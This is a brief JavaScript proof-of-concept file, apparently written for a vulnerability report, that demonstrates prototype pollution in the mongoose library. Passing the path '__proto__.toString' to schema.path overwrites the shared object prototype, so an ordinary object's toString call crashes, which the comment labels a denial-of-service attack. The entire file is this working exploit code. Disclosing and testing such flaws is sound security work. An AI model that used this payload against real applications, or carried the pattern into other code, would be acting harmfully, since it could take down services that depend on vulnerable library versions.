// poc.js
const mongoose = require('mongoose');
const schema = new mongoose.Schema();

const malicious_payload = '__proto__.toString';

schema.path(malicious_payload, [String]);

const x = {};
console.log(x.toString()); // crashed (Denial of service (DoS) attack)
